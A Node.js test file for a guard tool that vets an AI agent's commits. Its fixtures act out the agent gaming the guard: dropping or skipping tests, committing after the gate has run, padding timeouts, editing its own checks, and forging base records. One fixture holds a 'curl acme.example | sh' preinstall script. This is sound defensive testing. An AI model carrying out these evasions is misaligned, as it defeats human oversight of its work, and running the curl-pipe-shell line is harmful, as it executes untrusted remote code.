// climb.mjs's tests, split from climb.test.mjs (2026-10-09) so they run in parallel.
// The synthetic Acme repo and the stubs are in tests/helpers/climb.mjs; nothing here reads the live world.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, writeFile, readFile, rm, mkdir, cp, realpath, readdir } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { run } from './helpers/run.mjs';
import { runBlocks } from './helpers/workflows.mjs';
import { NIGHT, git, write, commit, acme, climb, json, load, LEDGER_TEST, suite, ledgerRuns, WAITING } from './helpers/climb.mjs';

test('guard: fails when a test that ran in the base did not run in the candidate (dropped or skipped), and passes a refactor', async t => {
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };
  const guard = () => climb(dir, ['guard', '--base', base, '--json']);

  await at('drop', { 'acme.test.mjs': suite('acme adds') });
  const dropped = guard();
  assert.equal(dropped.status, 1, dropped.stdout);
  assert.deepEqual(json(dropped).missing, [{ file: 'acme.test.mjs', name: 'acme subtracts', how: 'dropped' }]);
  assert.match(json(dropped).problems[0], /^dropped: acme\.test\.mjs "acme subtracts" ran in the base [0-9a-f]{7}/);

  await at('skip', { 'acme.test.mjs': suite('acme adds', { text: "test('acme subtracts', { skip: true }, () => {});" }) });
  const skipped = guard();
  assert.equal(skipped.status, 1, skipped.stdout);
  assert.deepEqual(json(skipped).missing.map(m => m.how), ['skipped']);

  await at('refactor', { 'acme.test.mjs': `${suite('acme adds', 'acme subtracts')}// shared fixture\n` });
  const ok = guard();
  assert.equal(ok.status, 0, ok.stdout + ok.stderr);
  assert.match(json(ok).line, /exit 0 on [0-9a-f]{7}; 2 tests ran, none dropped or skipped against the base/);
  // PR #59: the gate is the agent's code, run after the guard's checks. One that runs the suite, then
  // commits (or only stages) a change and exits 0, is refused: only the commit checked is ever taken.
  const checked = git(dir, ['rev-parse', 'HEAD']);
  const cfg = JSON.parse(await readFile(join(dir, '.keel/keel.json'), 'utf8'));
  for (const [tail, said] of [
    ['echo "// sneak" >> acme.test.mjs && git add acme.test.mjs && git commit -q -m sneak', /moved HEAD from [0-9a-f]{7} to [0-9a-f]{7} after the guard's checks/],
    ['echo "// sneak" >> acme.test.mjs && git add acme.test.mjs', /changed the tracked tree or the index after the guard's checks/],
  ]) {
    await writeFile(join(dir, '.keel/keel.json'), JSON.stringify({ ...cfg, check: `${LEDGER_TEST} && ${tail}` }));
    const moved = guard();
    assert.equal(moved.status, 1, moved.stdout + moved.stderr);
    assert.ok(json(moved).problems.some(p => said.test(p)), JSON.stringify(json(moved).problems));
    git(dir, ['reset', '-q', '--hard', checked]);
  }

  await at('red', { 'acme.test.mjs': suite('acme adds', { text: "test('acme subtracts', () => { throw new Error('acme'); });" }) });
  const red = guard();
  assert.equal(red.status, 1);
  assert.match(json(red).problems[0], /the gate `.*` failed \(exit 1\)/);

  // No ledger: guard cannot tell, and says so (exit 2), never a pass.
  // (The config is the project's, never the branch's: .keel/keel.json is off limits to a night's commits.)
  git(dir, ['checkout', '-q', '-f', 'refactor']);
  await commit(dir, { 'acme.test.mjs': `${suite('acme adds', 'acme subtracts')}// shared fixture, again\n` }, 'acme: no ledger');
  await writeFile(join(dir, '.keel/keel.json'), JSON.stringify({ name: 'Acme', check: 'node --test acme.test.mjs', climb: { jobs: ['test-time'], testCommand: 'node --test acme.test.mjs' } }));
  const blind = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(blind.status, 2);
  assert.match(json(blind).error, /recorded no test ledger run/);
});

test('sandbox: the agent\'s commits may not change a workflow, keel\'s scripts or .keel/keel.json; climb.mjs sandbox and both guards refuse them before anything runs', async t => {
  // A gate that would leave a mark if it ran: a refused branch never reaches it.
  const dir = await acme(t, { config: { check: 'node -e "require(\'fs\').writeFileSync(\'gate-ran\', \'\')"' }, files: { 'acme.mjs': 'export const anvil = 1;\n' } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };
  for (const [branch, path] of [['workflow', '.github/workflows/acme.yml'], ['script', 'scripts/keel/acme.mjs'], ['config', '.keel/keel.json']]) {
    const head = await at(branch, { [path]: path === '.keel/keel.json' ? '{"name":"Acme","climb":{"jobs":["test-time"]},"check":"true"}\n' : '// acme\n' });
    const sb = climb(dir, ['sandbox', '--base', base, '--head', head, '--json']);
    assert.equal(sb.status, 1, `${path}: ${sb.stdout}`);
    assert.equal(json(sb).ok, false);
    assert.match(json(sb).problems[0], new RegExp(`^${path.replace(/\./g, '\\.')}: changed on the agent's branch`));
    for (const args of [['guard', '--base', base, '--json'], ['guard', '--job', 'tend', '--base', base, '--json']]) {
      const g = climb(dir, args);
      assert.equal(g.status, 1, `${args.join(' ')} on ${path}: ${g.stdout}${g.stderr}`);
      assert.match(json(g).problems[0], /changed on the agent's branch/);
    }
    assert.equal(existsSync(join(dir, 'gate-ran')), false, `${path}: the gate never ran`);
    git(dir, ['checkout', '-q', '-f', 'main']);
  }
  // Anything else passes the sandbox; a head not on top of the base does not.
  const fine = await at('fine', { 'acme.mjs': 'export const anvil = 2;\n', 'docs/acme.md': '# Acme\n' });
  const ok = climb(dir, ['sandbox', '--base', base, '--head', fine, '--json']);
  assert.equal(ok.status, 0, ok.stdout);
  assert.deepEqual(json(ok), { ok: true, offLimits: ['.github/', 'scripts/keel/', '.keel/keel.json', '.keel/agent-git/'], problems: [] });
  const off = climb(dir, ['sandbox', '--base', fine, '--head', base, '--json']);
  assert.equal(off.status, 1);
  assert.match(json(off).problems[0], /is not on top of the base/);
  assert.equal(climb(dir, ['sandbox', '--base', base, '--json']).status, 2, 'sandbox needs both refs');
});

test('hygiene guard: refuses a diff that only raises a timeout or wraps a retry around the flaky test, naming the line; a real fix that also changes a timeout passes, with a note', async t => {
  const dir = await acme(t, { climb: { jobs: ['hygiene'], testCommand: LEDGER_TEST }, config: { check: LEDGER_TEST }, files: { 'acme.test.mjs': WAITING } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  await ledgerRuns(dir, { commit: base, tree: git(dir, ['rev-parse', 'HEAD^{tree}']), outcomes: ['pass', 'fail', 'pass'] });
  const baseline = json(climb(dir, ['measure', 'hygiene', '--baseline', '--json']));
  assert.equal(baseline.median, 1);
  assert.deepEqual(baseline.flaky.map(f => [f.file, f.name, f.passed, f.failed]), [['acme.test.mjs', 'acme waits', 2, 1]]);
  assert.match(baseline.flaky[0].alone, /^node --test --test-name-pattern='\^acme waits\$' acme\.test\.mjs$/);
  const at = async (branch, text) => { git(dir, ['checkout', '-q', '-b', branch, base]); return commit(dir, { 'acme.test.mjs': text }, `acme: ${branch}`); };
  const guard = () => climb(dir, ['guard', '--json']);

  // A longer timeout and nothing else: refused, naming the line. (Mutation: removing the refusal fails here.)
  await at('longer', WAITING.replace('{ timeout: 100 }', '{ timeout: 5000 }'));
  const longer = guard();
  assert.equal(longer.status, 1, longer.stdout + longer.stderr);
  assert.match(json(longer).problems[0], /^acme\.test\.mjs:3 `test\('acme waits', \{ timeout: 5000 \}, async \(\) => \{`: in the flaky test's file this diff only changes a timeout or a retry/);
  assert.equal(json(longer).refused[0].line, 3);

  // A retry wrapped around the body (its lines re-indented): still only a retry.
  await at('retry', WAITING.replace("  const id = Math.random().toString(36).slice(2, 6);\n  if (id.length > 4) throw new Error('acme');\n",
    "  for (let attempt = 0; attempt < 3; attempt++) {\n    try {\n      const id = Math.random().toString(36).slice(2, 6);\n      if (id.length > 4) throw new Error('acme');\n      break;\n    } catch {}\n  }\n"));
  const retry = guard();
  assert.equal(retry.status, 1, retry.stdout);
  assert.match(json(retry).problems[0], /^acme\.test\.mjs:4 `for \(let attempt = 0; attempt < 3; attempt\+\+\) \{`: .*only changes a timeout or a retry/);

  // The cause fixed, and the timeout changed too: it passes, and says so for the person.
  await at('fixed', WAITING.replace('{ timeout: 100 }', '{ timeout: 500 }').replace('.slice(2, 6)', '.slice(2, 6).padEnd(4, "0").slice(0, 4)'));
  const fixed = guard();
  assert.equal(fixed.status, 0, fixed.stdout + fixed.stderr);
  assert.match(json(fixed).noted[0].message, /^acme\.test\.mjs:3 .*changes a timeout or a retry beside 2 other changed lines: a real fix that also changes a timeout passes/);
  assert.match(fixed.stdout, /"line": "`node --test/);
  assert.deepEqual(JSON.parse(await readFile(join(dir, '.keel/climb/night.json'), 'utf8')).hygieneNotes.length, 1);
  // The same check by name, against an explicit base.
  assert.equal(climb(dir, ['guard', '--job', 'hygiene', '--base', base, '--json']).status, 0);
});

test('build guard: fails when the build output changes and no harmless reason names the path; passes byte-identical, or explained, and the PR names each reason', async t => {
  const build = text => `import { mkdirSync, writeFileSync } from 'node:fs';\nmkdirSync('dist/css', { recursive: true });\nwriteFileSync('dist/app.txt', ${JSON.stringify(text)});\nwriteFileSync('dist/css/acme.css', 'body{}\\n');\n`;
  const cfg = { jobs: ['build-time'], build: 'node build.mjs', buildOutput: 'dist/', testCommand: LEDGER_TEST };
  const dir = await acme(t, { climb: cfg, config: { check: LEDGER_TEST }, files: { 'build.mjs': build('acme anvils\n'), '.gitignore': 'dist/\n', 'acme.test.mjs': suite('acme adds') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const m = await load(dir);
  json(climb(dir, ['measure', 'build-time', '--baseline', '--runs', '1', '--json']));
  const at = async (branch, text) => { git(dir, ['checkout', '-q', '-b', branch, base]); return commit(dir, { 'build.mjs': text }, `acme: ${branch}`); };

  await at('same', `// one pass, not two\n${build('acme anvils\n')}`);
  const same = climb(dir, ['guard', '--json']);
  assert.equal(same.status, 0, same.stdout + same.stderr);
  assert.deepEqual([json(same).build.output, json(same).build.files, json(same).build.changes], ['dist', 2, []]);

  // The output changed and nothing says why: the guard fails, naming the path. (Mutation: accepting it fails here.)
  await at('changed', build('acme anvils, faster\n'));
  const changed = climb(dir, ['guard', '--json']);
  assert.equal(changed.status, 1, changed.stdout + changed.stderr);
  assert.deepEqual(json(changed).build.changes, [{ path: 'dist/app.txt', how: 'changed' }]);
  assert.match(json(changed).problems[0], /^build output changed: dist\/app\.txt differs from the base [0-9a-f]{7}'s and has no harmless reason \(climb\.mjs harmless --path dist\/app\.txt/);
  // A reason for another path is not a reason for this one.
  climb(dir, ['harmless', '--path', 'dist/css/acme.css', '--why', 'acme']);
  assert.equal(climb(dir, ['guard', '--json']).status, 1);
  const h = climb(dir, ['harmless', '--path', 'dist/app.txt', '--why', 'the banner text only; no code changes', '--json']);
  assert.equal(h.status, 0, h.stderr);
  const explained = climb(dir, ['guard', '--json']);
  assert.equal(explained.status, 0, explained.stdout + explained.stderr);
  const night = JSON.parse(await readFile(join(dir, '.keel/climb/night.json'), 'utf8'));
  assert.deepEqual(night.build.changes, [{ path: 'dist/app.txt', how: 'changed', why: 'the banner text only; no code changes' }]);

  // The PR names it under Merge danger, for the person to judge.
  const { prBody } = await import(pathToFileURL(join(NIGHT, 'pr-body.mjs')).href);
  const kept = { what: 'acme: one pass', verdict: 'keep', why: 'beat', candidate: 'a'.repeat(40), rounds: [{ base: 2000, candidate: 1000, change: -0.5 }] };
  const body = prBody(m.reportOf({ ...night, tried: [kept], final: null }).input);
  const danger = body.slice(body.indexOf('## Merge danger'));
  assert.match(danger, /^The build's output \(dist\) differs from the base's; each path with why it is harmless, for the person to judge:\n\n- `dist\/app\.txt \(changed\)`: the banner text only; no code changes$/m);
  const identical = prBody(m.reportOf({ ...night, build: { output: 'dist', files: 2, changes: [] }, tried: [kept], final: null }).input);
  assert.match(identical, /^The build's output \(dist, 2 files\) is byte-identical to the base's/m);
  assert.doesNotMatch(identical.slice(identical.indexOf('## Merge danger')), /harmless/);

  // build-time needs its command and what it writes.
  await writeFile(join(dir, '.keel/keel.json'), JSON.stringify({ name: 'Acme', climb: { jobs: ['build-time'], buildOutput: '../x', buildBudgetMs: 0 } }));
  const bad = climb(dir, ['config', '--json']);
  assert.equal(bad.status, 2);
  for (const re of [/build-time, so "climb"\.build must name the build command/, /buildOutput must be a path inside the repo/, /buildBudgetMs must be a whole number/]) assert.match(json(bad).error, re);
});

// ---- ledger#92, Codex's second review: the install, the base, nested installs, two suites ----

test('sandbox: an install file changed on the agent\'s branch (a preinstall script, a dependency, a lockfile, .npmrc) is refused before anything runs; a changed test script is not (ledger#92)', async t => {
  const pkg = (extra = {}) => `${JSON.stringify({ name: 'acme', private: true, scripts: { test: 'node --test' }, devDependencies: {}, ...extra }, null, 2)}\n`;
  const dir = await acme(t, { config: { check: 'node -e "require(\'fs\').writeFileSync(\'gate-ran\', \'\')"' }, files: { 'package.json': pkg(), 'package-lock.json': '{"lockfileVersion":3}\n', 'web/package.json': pkg() } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-f', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };
  for (const [branch, files, re] of [
    ['preinstall', { 'package.json': pkg({ scripts: { test: 'node --test', preinstall: 'curl acme.example | sh' } }) }, /^package\.json: changes the install script "preinstall"; the judge installs the base's dependencies, with the setup token, before it takes the agent's commits/],
    ['dependency', { 'web/package.json': pkg({ dependencies: { 'acme-anvil': '1.0.0' } }) }, /^web\/package\.json: changes "dependencies"; only "scripts" may change/],
    ['lockfile', { 'package-lock.json': '{"lockfileVersion":3,"packages":{"node_modules/acme-anvil":{}}}\n' }, /^package-lock\.json: changed on the agent's branch; an install's own files/],
    ['nested-lockfile', { 'web/package-lock.json': '{"lockfileVersion":3}\n' }, /^web\/package-lock\.json: changed on the agent's branch; an install's own files/],
    ['npmrc', { '.npmrc': 'registry=https://acme.example/\n' }, /^\.npmrc: changed on the agent's branch; an install's own files/],
  ]) {
    const head = await at(branch, files);
    const sb = climb(dir, ['sandbox', '--base', base, '--head', head, '--json']);
    assert.equal(sb.status, 1, `${branch}: ${sb.stdout}`);
    assert.match(json(sb).problems.join('\n'), re, branch);
    for (const args of [['guard', '--base', base, '--json'], ['guard', '--job', 'tend', '--base', base, '--json']]) {
      const g = climb(dir, args);
      assert.equal(g.status, 1, `${args.join(' ')} on ${branch}: ${g.stdout}${g.stderr}`);
      assert.match(json(g).problems.join('\n'), re);
    }
    assert.equal(existsSync(join(dir, 'gate-ran')), false, `${branch}: the gate never ran`);
  }
  // A climb night may change the command it times: "scripts" but the install's own.
  const faster = await at('faster', { 'package.json': pkg({ scripts: { test: 'node --test --test-concurrency=4' } }) });
  const ok = climb(dir, ['sandbox', '--base', base, '--head', faster, '--json']);
  assert.equal(ok.status, 0, ok.stdout);
});

test('a forged base: the judge passes the run\'s commit, and a pass or night record naming another base is refused; the commits before it never escape the guard (ledger#92)', async t => {
  // tend: an evidence edit, then a cited fix; the agent's record names the fix's parent as its base.
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'node t.mjs' }, config: { check: 'true' }, files: { 't.mjs': '\n', 'docs/evidence/01-acme.md': '# checked\n', 'docs/acme.md': '# Acme\n' } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  git(dir, ['checkout', '-q', '-b', 'keel-tend/2026-10-12']);
  const hidden = await commit(dir, { 'docs/evidence/01-acme.md': '# checked, and lived-in\n' }, 'acme: evidence\n\nTend: drift:1');
  await commit(dir, { 'docs/acme.md': '# Acme, fixed\n' }, 'acme: a fix\n\nTend: drift:1');
  const pass = forged => write(dir, { '.keel/tend/.gitignore': '*\n', '.keel/tend/pass.json': JSON.stringify({ date: '2026-10-12', base: forged, worksheet: { findings: [{ id: 'drift:1' }] }, notes: [] }) });
  await pass(hidden);
  const g = climb(dir, ['guard', '--job', 'tend', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.match(json(g).problems[0], new RegExp(`^\\.keel/tend/pass\\.json names its base ${hidden.slice(0, 12)}, not the run's commit ${base.slice(0, 7)} \\(--base\\)`));
  const rep = climb(dir, ['tend-report', '--base', base, '--json']);
  assert.equal(rep.status, 2, rep.stdout);
  assert.match(json(rep).error, /pass\.json names its base/);
  // The record naming the run's commit: the evidence edit is guarded, and refused.
  await pass(base);
  const honest = climb(dir, ['guard', '--job', 'tend', '--base', base, '--json']);
  assert.equal(honest.status, 1);
  assert.match(json(honest).problems.join('\n'), /^docs\/evidence\/01-acme\.md:1: edits evidence/m);

  // climb: the night's record names a commit past the run's.
  git(dir, ['checkout', '-q', '-f', '-b', 'keel-climb/test-time/2026-10-12', base]);
  json(climb(dir, ['measure', 'test-time', '--baseline', '--runs', '1', '--json']));
  const first = await commit(dir, { 't.mjs': '// first\n' }, 'acme: first');
  await commit(dir, { 't.mjs': '// second\n' }, 'acme: second');
  const nightFile = join(dir, '.keel/climb/night.json');
  const night = JSON.parse(await readFile(nightFile, 'utf8'));
  assert.equal(night.base, base);
  await writeFile(nightFile, JSON.stringify({ ...night, base: first }));
  const cg = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(cg.status, 1, cg.stdout + cg.stderr);
  assert.match(json(cg).problems[0], new RegExp(`^\\.keel/climb/night\\.json names its base ${first.slice(0, 12)}, not the run's commit ${base.slice(0, 7)}`));
  for (const args of [['settle', '--base', base], ['compare', '--final', '--base', base, '--runs', '1'], ['report', '--base', base]]) {
    const r = climb(dir, [...args, '--json']);
    assert.equal(r.status, 2, `${args[0]}: ${r.stdout}`);
    assert.match(json(r).error, /night\.json names its base/, args[0]);
  }
  assert.equal(git(dir, ['rev-list', '--count', `${base}..HEAD`]), '2', 'settle reset nothing on a forged record');
  // The record naming the run's commit: settle goes ahead.
  await writeFile(nightFile, JSON.stringify(night));
  assert.equal(climb(dir, ['settle', '--base', base, '--json']).status, 0);
});

test('worktrees share every install the tree has: the root\'s and each app or workspace folder\'s own node_modules, so a nested build runs on both sides (ledger#92)', async t => {
  const cfg = { jobs: ['build-time'], build: 'node web/build.mjs', buildOutput: 'dist/' };
  const build = tag => `// ${tag}\nimport { anvil } from 'acme-anvil';\nimport { mkdirSync, writeFileSync } from 'node:fs';\nmkdirSync('dist', { recursive: true });\nwriteFileSync('dist/app.txt', anvil);\n`;
  const dep = { 'package.json': '{"name":"acme-anvil","type":"module","exports":"./index.js"}\n', 'index.js': "export const anvil = 'acme anvils\\n';\n" };
  const dir = await acme(t, { climb: cfg, files: {
    '.gitignore': 'node_modules/\ndist/\n',
    'package.json': JSON.stringify({ name: 'acme', private: true, workspaces: ['packages/*'] }),
    'web/package.json': '{"name":"acme-web","private":true,"type":"module"}\n', 'web/build.mjs': build('base'),
    'packages/ui/package.json': '{"name":"acme-ui","private":true}\n',
    ...Object.fromEntries(Object.entries(dep).map(([p, s]) => [`web/node_modules/acme-anvil/${p}`, s])),
    ...Object.fromEntries(Object.entries(dep).map(([p, s]) => [`packages/ui/node_modules/acme-anvil/${p}`, s])),
    'node_modules/acme-root/package.json': '{"name":"acme-root"}\n',
  } });
  assert.equal(existsSync(join(dir, 'web/node_modules/acme-anvil/index.js')), true);
  assert.equal(git(dir, ['ls-files', 'web/node_modules']), '', 'the nested install is not tracked');
  const base = git(dir, ['rev-parse', 'HEAD']);
  const head = await commit(dir, { 'web/build.mjs': build('one pass') }, 'acme: one pass');
  const m = await load(dir);
  assert.deepEqual((await m.packageDirs(dir)).sort(), ['packages/ui', 'web']);
  const config = JSON.parse(await readFile(join(dir, '.keel/keel.json'), 'utf8'));
  // Mutation: linking the root's node_modules alone fails here (`acme-anvil` not found in web/).
  const built = await m.buildChanges(dir, { config, base, candidate: head });
  assert.deepEqual([built.files, built.changes], [1, []]);
});

test('guard: a gate that records a run per suite (the root\'s, then web\'s) is compared whole, every suite of each commit; the newest alone would be one suite (ledger#92)', async t => {
  const reporter = dest => `--test-reporter=spec --test-reporter-destination=stdout --test-reporter=${dest}scripts/keel/test-ledger.mjs --test-reporter-destination=stdout`;
  const TWO = `node --test ${reporter('./')} acme.test.mjs && cd web && node --test ${reporter('../')} web.test.mjs`;
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: TWO }, config: { check: TWO }, files: { 'acme.test.mjs': suite('acme adds', 'acme subtracts'), 'web/web.test.mjs': suite('acme renders') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  const at = async (branch, files) => { git(dir, ['checkout', '-q', '-f', '-b', branch, base]); return commit(dir, files, `acme: ${branch}`); };

  await at('refactor', { 'acme.test.mjs': `${suite('acme adds', 'acme subtracts')}// shared fixture\n` });
  const ok = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(ok.status, 0, ok.stdout + ok.stderr);
  assert.match(json(ok).line, /; 3 tests ran, none dropped or skipped against the base/);
  const runs = (await import(pathToFileURL(join(dir, 'scripts/keel/test-ledger.mjs')).href)).readRuns;
  const head = git(dir, ['rev-parse', 'HEAD']);
  assert.deepEqual((await runs(dir)).runs.filter(r => r.commit === head).map(r => r.dir).sort(), ['.', 'web'], 'two lanes on one commit');

  // The root suite drops a test; web's runs last. (Mutation: the newest record alone sees web's suite only, and passes.)
  await at('drop', { 'acme.test.mjs': suite('acme adds') });
  const dropped = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(dropped.status, 1, dropped.stdout + dropped.stderr);
  assert.deepEqual(json(dropped).missing, [{ file: 'acme.test.mjs', name: 'acme subtracts', how: 'dropped' }]);
  // Pure: a test counts as run when any record of the commit ran it.
  const m = await load(dir);
  const r = m.ranOn([{ commit: 'c', tests: [{ file: 'a', name: 'x', outcome: 'skip' }] }, { commit: 'c', tests: [{ file: 'a', name: 'x', outcome: 'pass' }, { file: 'web/b', name: 'y', outcome: 'pass' }] }, { commit: 'd', tests: [{ file: 'z', name: 'z', outcome: 'pass' }] }], 'c');
  assert.deepEqual(r.tests.map(x => [x.file, x.outcome]), [['a', 'pass'], ['web/b', 'pass']]);
  assert.equal(m.ranOn([], 'c'), null);
});

test('guard: only the records its own gate run wrote count; a suite the candidate dropped from its gate is not masked by a record the agent left at that commit (ledger#94)', async t => {
  const reporter = dest => `--test-reporter=spec --test-reporter-destination=stdout --test-reporter=${dest}scripts/keel/test-ledger.mjs --test-reporter-destination=stdout`;
  const ROOT = `node --test ${reporter('./')} acme.test.mjs`, WEB = `cd web && node --test ${reporter('../')} web.test.mjs`;
  // The gate is the project's own script (as ledger's `npm run check`): a branch may change what it runs.
  const gateFile = suites => `const { execSync } = require('node:child_process');\n${suites.map(c => `execSync(${JSON.stringify(c)}, { stdio: 'inherit' });`).join('\n')}\n`;
  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'node gate.cjs' }, config: { check: 'node gate.cjs' }, files: { 'gate.cjs': gateFile([ROOT, WEB]), 'acme.test.mjs': suite('acme adds'), 'web/web.test.mjs': suite('acme renders') } });
  const base = git(dir, ['rev-parse', 'HEAD']);
  // A ledger record of the base the agent's job handed back, naming a test the base never ran: not read.
  await ledgerRuns(dir, { commit: base, tree: git(dir, ['rev-parse', 'HEAD^{tree}']), outcomes: ['pass'], file: 'acme.test.mjs', name: 'acme forged', others: [] });
  git(dir, ['checkout', '-q', '-b', 'narrow']);
  const head = await commit(dir, { 'gate.cjs': gateFile([ROOT]) }, 'acme: a faster gate');
  // The agent tests the web suite directly at the candidate, as the protocol tells it to test what it touched.
  assert.equal(run('sh', ['-c', WEB], { cwd: dir }).status, 0);
  const runs = (await import(pathToFileURL(join(dir, 'scripts/keel/test-ledger.mjs')).href)).readRuns;
  assert.ok((await runs(dir)).runs.some(r => r.commit === head && r.tests.some(x => x.name === 'acme renders')), 'a record at the candidate holds web\'s test');
  // Mutation: counting every record at the candidate SHA passes here.
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 1, g.stdout + g.stderr);
  assert.deepEqual(json(g).missing, [{ file: 'web/web.test.mjs', name: 'acme renders', how: 'dropped' }]);
  assert.doesNotMatch(g.stdout, /acme forged/, 'the base is its own gate run, never a handed-back record');
});

test('worktrees go beside the checkout, so a sibling the setup cloned (ledger\'s ../ledger-data) resolves for the base\'s gate as for the candidate\'s; none is left behind, even on a failure (ledger#95)', async t => {
  const made = await acme(t, { climb: { jobs: ['test-time'], testCommand: LEDGER_TEST }, files: { 'acme.test.mjs': suite('acme adds') } });
  // Acme's data, as its setup clones it: a sibling of the checkout.
  const parent = await mkdtemp(join(tmpdir(), 'keel-climb-sibling-'));
  t.after(() => rm(parent, { recursive: true, force: true }));
  const dir = join(parent, 'acme');
  await cp(made, dir, { recursive: true });
  await write(parent, { 'acme-data/x': 'anvils\n' });
  const GATE = `node -e "require('fs').readFileSync('../acme-data/x')" && ${LEDGER_TEST}`;
  await writeFile(join(dir, '.keel/keel.json'), `${JSON.stringify({ name: 'Acme', climb: { jobs: ['test-time'], testCommand: LEDGER_TEST, build: GATE.replace(LEDGER_TEST, 'node -e "require(\'fs\').mkdirSync(\'dist\',{recursive:true});require(\'fs\').writeFileSync(\'dist/a\',\'a\')"'), buildOutput: 'dist/' }, check: GATE }, null, 2)}\n`);
  git(dir, ['commit', '-q', '-am', 'acme: the gate reads its data']);
  const base = git(dir, ['rev-parse', 'HEAD']);
  await commit(dir, { 'acme.test.mjs': `${suite('acme adds')}// shared fixture\n` }, 'acme: a refactor');
  const leftovers = async () => (await readdir(parent)).filter(n => n.startsWith('.keel-climb-'));
  // Mutation: worktrees under the OS temp (no ../acme-data there) fail the base's gate, and the guard with it.
  const g = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(g.status, 0, g.stdout + g.stderr);
  assert.match(json(g).line, /; 1 tests ran, none dropped or skipped against the base/);
  assert.deepEqual(await leftovers(), []);
  const m = await load(dir);
  const config = JSON.parse(await readFile(join(dir, '.keel/keel.json'), 'utf8'));
  assert.deepEqual((await m.buildChanges(dir, { config, base, candidate: 'HEAD' })).changes, []);
  // A build that fails: the error, and still nothing left beside the checkout.
  await assert.rejects(m.buildChanges(dir, { config: { ...config, climb: { ...config.climb, build: 'node -e "process.exit(3)"' } }, base, candidate: 'HEAD' }), /failed on the base/);
  assert.deepEqual(await leftovers(), []);
  assert.equal(git(dir, ['worktree', 'list']).split('\n').length, 1, 'no worktree registered');
});
